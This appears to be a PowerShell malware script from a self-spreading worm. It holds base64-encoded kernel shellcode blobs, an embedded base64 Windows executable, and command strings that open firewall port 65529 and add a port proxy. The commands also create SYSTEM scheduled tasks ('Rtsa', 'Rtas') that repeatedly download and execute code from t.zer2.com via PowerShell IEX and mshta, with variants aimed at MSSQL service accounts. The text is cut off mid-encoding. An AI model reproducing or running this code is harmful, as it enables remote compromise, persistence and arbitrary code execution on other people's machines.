$sc=[Convert]::FromBase64String("McBAD4TyBAAAYOgAAAAAW+gjAAAAuXYBAAAPMo17OTn4dBE5RQB0BolFAIlVCIn4MdIPMGHCJACNqwAQAADB7QzB5QyD7VDDuSMAAABqMA+hjtmOwWSLDUAAAACLYQRRnGDoAAAAAFvoy////4tFAIPAF4lEJCQxwJlC8A+wVQh1Erl2AQAAmYtFAA8w++gEAAAA+mGdw4tFAMHoDMHgDC0AEAAAZoE4TVp19IlFBL
h4fPTb6LcAAACXuD9fZHdX6KsAAAAp+InBPXABAAB1A4PACI1YHI00H2ShJAEAAIs2ifIpwoH6AAQAAHfyUrjhFAEX6H8AAACLQAqNUASNNA/orwAAAD1aavrBdA492IPgPnQHizwXKdfr44l9DI0cH411EF+LWwQxwFVqAVVQ6AAAAACBBCSSAAAAUFMpPCRWuMRcGW3oJQAAADHAUFBQVrg0Rsyv6BUAAACFwHTGi0UcgHgOAXQHiQCJQATrtsPoAgAAAP/gY
IttBJeLRTyLVAV4AeqLShiLWiAB60mLNIsB7ugdAAAAOfh18YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcNSMcCZrMHKDQHChcB19pJaw1iJRCQQWFlYWmBSUYsoMcBkoiQAAACZsEBQweAGUFRSiRFRSlK46pluV+h7////hcB1T1iLOOgAAAAAXoPGVbkABAAA86SLRQxQuEi4GLjoVv///4tADItAFIsAZoN4JBh194tQKIF6DDMAMgB164tYEIldBLheUV6D
6DL///9ZiQExwIhFCEBkoiQAAABhw1pYWFlRUVHoAAAAAIMEJAlRUVL/4PzoggAAAGCJ5THAZItQMItSDItSFItyKA+3SiYx/6w8YXwCLCDBzw0Bx+LyUleLUhCLSjyLTBF440gB0VGLWSAB04tJGOM6SYs0iwHWMf+swc8NAcc44HX2A334O30kdeRYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4F9fWosS641dagGNhbIAAABQaDGLb4f/1bvgHSo
KaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9VjbWQuZXhlIC9jIG5ldHNoLmV4ZSBmaXJld2FsbCBhZGQgcG9ydG9wZW5pbmcgdGNwIDY1NTI5IFNETlMmbmV0c2guZXhlIGludGVyZmFjZSBwb3J0cHJveHkgYWRkIHY0dG92NCBsaXN0ZW5wb3J0PTY1NTI5IGNvbm5lY3RhZGRyZXNzPTEuMS4xLjEgY29ubmVjdHBvcnQ9NTMgJiBzY2h0YXNrcyAvY3JlYX
RlIC9ydSBzeXN0ZW0gL3NjIE1JTlVURSAvbW8gNDAgL3RuIFJ0c2EgL3RyICJwb3dlcnNoZWxsIC1lcCBieXBhc3MgLWMgJ0lFWChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZyhcXFwiaHR0cDovL3QuemVyMi5jb20vZWIuanNwXFxcIiknIiAvRiAmIGVjaG8gJXBhdGglfGZpbmRzdHIgL2kgcG93ZXJzaGVsbD5ud
WwgfHwgKHNldHggcGF0aCAiJXBhdGglO2M6XHdpbmRvd3Ncc3lzdGVtMzJcV2luZG93c1Bvd2Vyc2hlbGxcdjEuMCIgL20pICYgc2NodGFza3MgL3J1biAvdG4gUnRzYQAKVeguAAAAuYIAAMAPMkyNDTQAAABEOch0GTlFAHQKiVUEiUUAxkX4AEmRUFpIweogDzBdw0iNLQAQAABIwe0MSMHlDEiD7XDDDwH4ZUiJJCUQAAAAZUiLJCWoAQAAaitl/zQlEAAA
AFBQVejF////SItFAEiDwB9IiUQkEFFSQVBBUUFSQVMxwLIB8A+wVfh1FLmCAADAi0UAi1UEDzD76A4AAAD6QVtBWkFZQVhaWV1Yw0FXQVZXVlNQTIt9AEnB7wxJwecMSYHvABAAAGZBgT9NWnXxTIl9CGVMizQliAEAAL94fPTb6OwAAABIkb8/X2R36OcAAACLQAOJwz0ABAAAcgODwBBIjVAoTI0EEU2JwU2LCU05yA+EsQAAAEyJyEwp8Eg9AAcAAHfmTSn
Ov+EUARfopgAAAIt4A4PHCEiNNBno3wAAAD1aavrBdBA92IPgPnQJSIsMOUgp+evgv0i4GLjobwAAAEiJRfBIjTQRSInzSItbCEg53nT3SI1NEE0xwEyNDa0AAABVagFVQVBKjRQzSIPsIL/EXBlt6DUAAABIjU0QTTHJvzRGzK/oJAAAAEiDxECFwHS4SItFIIB4GgF0CUiJAEiJQAjrpVhbXl9BXkFfw+gCAAAA/+BTUVZBi0c8QYuEB4gAAABMAfhQi0gYi1
ggTAH7/8mLNItMAf7oHwAAADn4de9Yi1gkTAH7ZosMS4tYHEwB+4sEi0wB+F5ZW8NSMcCZrMHKDQHChcB19pJaw1VTV1ZBV0mLKEyLfQhSXkyJyzHARA8iwEiJAonBSPfRSYnAsEBQweAGUEmJAUiD7CC/6pluV+hl////SIPEMIXAdUVIiz5IjTVNAAAAuQAGAADzpEiLRfBIi0AYSItAIEiLAGaDeEgYdfZIi1BQgXoMMwAyAHXpTIt4IL9eUV6D6CL///9Ii
QMxyYhN+LEBRA8iwUFfXl9bXcNIkjHJUVFJiclMjQUNAAAAicpIg+wg/9BIg8Qww/xIg+Tw6MAAAABBUUFQUlFWSDHSZUiLUmBIi1IYSItSIEiLclBID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVFIi1Igi0I8SAHQi4CIAAAASIXAdGdIAdBQi0gYRItAIEkB0ONWSP/JQYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18UwDTCQIRTnRddhYRItAJEkB0GZB
iwxIRItAHEkB0EGLBIhIAdBBWEFYXllaQVhBWUFaSIPsIEFS/+BYQVlaSIsS6Vf///9dSLoBAAAAAAAAAEiNjQEBAABBujGLb4f/1bvgHSoKQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1WNtZC5leGUgL2MgbmV0c2guZXhlIGZpcmV3YWxsIGFkZCBwb3J0b3BlbmluZyB0Y3AgNjU1MjkgU0ROUyZuZXRzaC5leGUgaW50ZXJmYWNlIHBvcnR
wcm94eSBhZGQgdjR0b3Y0IGxpc3RlbnBvcnQ9NjU1MjkgY29ubmVjdGFkZHJlc3M9MS4xLjEuMSBjb25uZWN0cG9ydD01MyAmIHNjaHRhc2tzIC9jcmVhdGUgL3J1IHN5c3RlbSAvc2MgTUlOVVRFIC9tbyA0MCAvdG4gUnRzYSAvdHIgInBvd2Vyc2hlbGwgLWVwIGJ5cGFzcyAtYyAnSUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd2
5sb2FkU3RyaW5nKFxcXCJodHRwOi8vdC56ZXIyLmNvbS9lYi5qc3BcXFwiKSciIC9GICYgZWNobyAlcGF0aCV8ZmluZHN0ciAvaSBwb3dlcnNoZWxsPm51bCB8fCAoc2V0eCBwYXRoICIlcGF0aCU7Yzpcd2luZG93c1xzeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wIiAvbSkgJiBzY2h0YXNrcyAvcnVuIC90biBSdHNhAAo=")
$sco=[Convert]::FromBase64String("McBAD4TzBAAAYOgAAAAAW+gjAAAAuXYBAAAPMo17OTn4dBE5RQB0BolFAIlVCIn4MdIPMGHCJACNqwAQAADB7QzB5QyD7VDDuSMAAABqMA+hjtmOwWSLDUAAAACLYQRRnGDoAAAAAFvoy////4tFAIPAF4lEJCQxwJlC8A+wVQh1Erl2AQAAmYtFAA8w++gEAAAA+mGdw4tFAMHoDMHgDC0AEAAAZoE4TVp19IlFB
Lh4fPTb6LcAAACXuD9fZHdX6KsAAAAp+InBPXABAAB1A4PACI1YHI00H2ShJAEAAIs2ifIpwoH6AAQAAHfyUrjhFAEX6H8AAACLQAqNUASNNA/orwAAAD1aavrBdA492IPgPnQHizwXKdfr44l9DI0cH411EF+LWwQxwFVqAVVQ6AAAAACBBCSSAAAAUFMpPCRWuMRcGW3oJQAAADHAUFBQVrg0Rsyv6BUAAACFwHTGi0UcgHgOAXQHiQCJQATrtsPoAgAAAP/g
YIttBJeLRTyLVAV4AeqLShiLWiAB60mLNIsB7ugdAAAAOfh18YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcNSMcCZrMHKDQHChcB19pJaw1iJRCQQWFlYWmBSUYsoMcBkoiQAAACZsEBQweAGUFRSiRFRSlK46pluV+h7////hcB1T1iLOOgAAAAAXoPGVbkABAAA86SLRQxQuEi4GLjoVv///4tADItAFIsAZoN4JBh194tQKIF6DDMAMgB164tYEIldBLheUV6
D6DL///9ZiQExwIhFCEBkoiQAAABhw1pYWFlRUVHoAAAAAIMEJAlRUVL/4PzoggAAAGCJ5THAZItQMItSDItSFItyKA+3SiYx/6w8YXwCLCDBzw0Bx+LyUleLUhCLSjyLTBF440gB0VGLWSAB04tJGOM6SYs0iwHWMf+swc8NAcc44HX2A334O30kdeRYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4F9fWosS641dagGNhbIAAABQaDGLb4f/1bvgHS
oKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9VjbWQuZXhlIC9jIG5ldHNoLmV4ZSBmaXJld2FsbCBhZGQgcG9ydG9wZW5pbmcgdGNwIDY1NTI5IFNETlMmbmV0c2guZXhlIGludGVyZmFjZSBwb3J0cHJveHkgYWRkIHY0dG92NCBsaXN0ZW5wb3J0PTY1NTI5IGNvbm5lY3RhZGRyZXNzPTEuMS4xLjEgY29ubmVjdHBvcnQ9NTMgJiBzY2h0YXNrcyAvY3JlY
XRlIC9ydSBzeXN0ZW0gL3NjIE1JTlVURSAvbW8gNDAgL3RuIFJ0c2EgL3RyICJwb3dlcnNoZWxsIC1lcCBieXBhc3MgLWMgJ0lFWChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZyhcXFwiaHR0cDovL3QuemVyMi5jb20vZWJvLmpzcFxcXCIpJyIgL0YgJiBlY2hvICVwYXRoJXxmaW5kc3RyIC9pIHBvd2Vyc2hlbGw+
bnVsIHx8IChzZXR4IHBhdGggIiVwYXRoJTtjOlx3aW5kb3dzXHN5c3RlbTMyXFdpbmRvd3NQb3dlcnNoZWxsXHYxLjAiIC9tKSAmIHNjaHRhc2tzIC9ydW4gL3RuIFJ0c2EAClXoLgAAALmCAADADzJMjQ00AAAARDnIdBk5RQB0ColVBIlFAMZF+ABJkVBaSMHqIA8wXcNIjS0AEAAASMHtDEjB5QxIg+1www8B+GVIiSQlEAAAAGVIiyQlqAEAAGorZf80JRA
AAABQUFXoxf///0iLRQBIg8AfSIlEJBBRUkFQQVFBUkFTMcCyAfAPsFX4dRS5ggAAwItFAItVBA8w++gOAAAA+kFbQVpBWUFYWlldWMNBV0FWV1ZTUEyLfQBJwe8MScHnDEmB7wAQAABmQYE/TVp18UyJfQhlTIs0JYgBAAC/eHz02+jsAAAASJG/P19kd+jnAAAAi0ADicM9AAQAAHIDg8AQSI1QKEyNBBFNicFNiwlNOcgPhLEAAABMichMKfBIPQAHAAB35k
0pzr/hFAEX6KYAAACLeAODxwhIjTQZ6N8AAAA9Wmr6wXQQPdiD4D50CUiLDDlIKfnr4L9IuBi46G8AAABIiUXwSI00EUiJ80iLWwhIOd5090iNTRBNMcBMjQ2tAAAAVWoBVUFQSo0UM0iD7CC/xFwZbeg1AAAASI1NEE0xyb80Rsyv6CQAAABIg8RAhcB0uEiLRSCAeBoBdAlIiQBIiUAI66VYW15fQV5BX8PoAgAAAP/gU1FWQYtHPEGLhAeIAAAATAH4UItIG
ItYIEwB+//JizSLTAH+6B8AAAA5+HXvWItYJEwB+2aLDEuLWBxMAfuLBItMAfheWVvDUjHAmazByg0BwoXAdfaSWsNVU1dWQVdJiyhMi30IUl5MicsxwEQPIsBIiQKJwUj30UmJwLBAUMHgBlBJiQFIg+wgv+qZblfoZf///0iDxDCFwHVFSIs+SI01TQAAALkABgAA86RIi0XwSItAGEiLQCBIiwBmg3hIGHX2SItQUIF6DDMAMgB16UyLeCC/XlFeg+gi////
SIkDMcmITfixAUQPIsFBX15fW13DSJIxyVFRSYnJTI0FDQAAAInKSIPsIP/QSIPEMMP8SIPk8OjAAAAAQVFBUFJRVkgx0mVIi1JgSItSGEiLUiBIi3JQSA+3SkpNMclIMcCsPGF8AiwgQcHJDUEBweLtUkFRSItSIItCPEgB0IuAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdB
mQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulX////XUi6AQAAAAAAAABIjY0BAQAAQboxi2+H/9W74B0qCkG6ppW9nf/VSIPEKDwGfAqA++B1BbtHE3JvagBZQYna/9VjbWQuZXhlIC9jIG5ldHNoLmV4ZSBmaXJld2FsbCBhZGQgcG9ydG9wZW5pbmcgdGNwIDY1NTI5IFNETlMmbmV0c2guZXhlIGludGVyZmFjZSBwb3
J0cHJveHkgYWRkIHY0dG92NCBsaXN0ZW5wb3J0PTY1NTI5IGNvbm5lY3RhZGRyZXNzPTEuMS4xLjEgY29ubmVjdHBvcnQ9NTMgJiBzY2h0YXNrcyAvY3JlYXRlIC9ydSBzeXN0ZW0gL3NjIE1JTlVURSAvbW8gNDAgL3RuIFJ0c2EgL3RyICJwb3dlcnNoZWxsIC1lcCBieXBhc3MgLWMgJ0lFWChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb
3dubG9hZFN0cmluZyhcXFwiaHR0cDovL3QuemVyMi5jb20vZWJvLmpzcFxcXCIpJyIgL0YgJiBlY2hvICVwYXRoJXxmaW5kc3RyIC9pIHBvd2Vyc2hlbGw+bnVsIHx8IChzZXR4IHBhdGggIiVwYXRoJTtjOlx3aW5kb3dzXHN5c3RlbTMyXFdpbmRvd3NQb3dlcnNoZWxsXHYxLjAiIC9tKSAmIHNjaHRhc2tzIC9ydW4gL3RuIFJ0c2EACg==")
$ipc_cmd='netsh.exe firewall add portopening tcp 65529 SDNS&netsh interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53&schtasks /create /ru system /sc MINUTE /mo 10 /tn Rtsa /tr "powershell -nop -ep bypass -c ''IEX(New-Object System.N
et.WebClient).DownloadString(\\\"http://t.zer2.com/ipc.jsp?h\\\")''" /F & echo %%path%%|findstr /i powershell>nul || (setx path "%path%;c:\windows\system32\WindowsPowershell\v1.0" /m) &schtasks /run /tn Rtsa & ver|findstr "5\.[0-9]\.[0-9][0-9]*" && (schtasks /create 
/ru system /sc MINUTE /mo 60 /tn Rtas /tr "mshta http://t.zer2.com/p.html?_%%COMPUTERNAME%%")'
$ipco_cmd='netsh.exe firewall add portopening tcp 65529 SDNS&netsh interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53&schtasks /create /ru system /sc MINUTE /mo 10 /tn Rtsa /tr "powershell -nop -ep bypass -c ''IEX(New-Object System.
Net.WebClient).DownloadString(\\\"http://t.zer2.com/ipco.jsp?h\\\")''" /F & echo %%path%%|findstr /i powershell>nul || (setx path "%path%;c:\windows\system32\WindowsPowershell\v1.0" /m) &schtasks /run /tn Rtsa & ver|findstr "5\.[0-9]\.[0-9][0-9]*" && (schtasks /creat
e /ru system /sc MINUTE /mo 60 /tn Rtas /tr "mshta http://t.zer2.com/p.html?_%%COMPUTERNAME%%")'
$base_core='dHJ5eyhuZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpKS5SdW4oInZlcnxmaW5kc3RyICI1XC5bMC05XVwuWzAtOV1bMC05XSoiICYmIChtc2h0YSBodHRwOi8vdC56ZXIyLmNvbS9wLmh0bWw/XyVDT01QVVRFUk5BTUUlICYmIHBpbmcgbG9jYWxob3N0ICYmIHRhc2traWxsIC9mIC9pbSBtc2h0YS5leGUpICYgZWNobyAlcGF
0aCV8ZmluZHN0ciAvaSBwb3dlcnNoZWxsPm51bCB8fCAoc2V0eCBwYXRoICIlcGF0aCU7Yzpcd2luZG93c1xzeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wIiAvbSkgJiBwb3dlcnNoZWxsIC13IGhpZGRlbiAtZXAgYnlwYXNzIC1jIHdoaWxlKCRUcnVlKXt0cnl7SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2Fkc3RyaW5nKC
dodHRwOi8vdC56ZXIyLmNvbS9pcGMuanNwP2wnKX1jYXRjaHtTbGVlcCAtbSAyNTAwMDAwfX0iLDAsZmFsc2UpO31jYXRjaChlKXt9XG5cbg=='
$mssql_cmd='netsh.exe firewall add portopening tcp 65529 SDNS&netsh interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53&schtasks /create /ru system /sc MINUTE /mo 40 /tn Rtsa /tr "powershell -nop -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8
AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdAAuAHoAZQByADIALgBjAG8AbQAvAG0AcwAuAGoAcwBwACcAKQA=" /F & echo %path%|findstr /i powershell>nul || (setx path "%path%;c:\windows\
system32\WindowsPowershell\v1.0" /m) &schtasks /run /tn Rtsa & whoami|findstr /i "network service"&&(powershell -nop -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
KAAnAGgAdAB0AHAAOgAvAC8AdAAuAHoAZQByADIALgBjAG8AbQAvAHYALgBqAHMAcAA/AG0AcwBsAG8AdwAnACkA)'
$mssqlo_cmd='netsh.exe firewall add portopening tcp 65529 SDNS&netsh interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53&schtasks /create /ru system /sc MINUTE /mo 40 /tn Rtsa /tr "powershell -nop -ep bypass -e SQBFAFgAKABOAGUAdwAtAE
8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdAAuAHoAZQByADIALgBjAG8AbQAvAG0AcwBvAC4AagBzAHAAJwApAA==" /F & echo %path%|findstr /i powershell>nul || (setx path "%path%;c:\win
dows\system32\WindowsPowershell\v1.0" /m) &schtasks /run /tn Rtsa & whoami|findstr /i "network service"&&(powershell -nop -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQB
uAGcAKAAnAGgAdAB0AHAAOgAvAC8AdAAuAHoAZQByADIALgBjAG8AbQAvAHYALgBqAHMAcAA/AG0AcwBvAGwAbwB3ACcAKQA=)'
$blue3_bin_b64='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
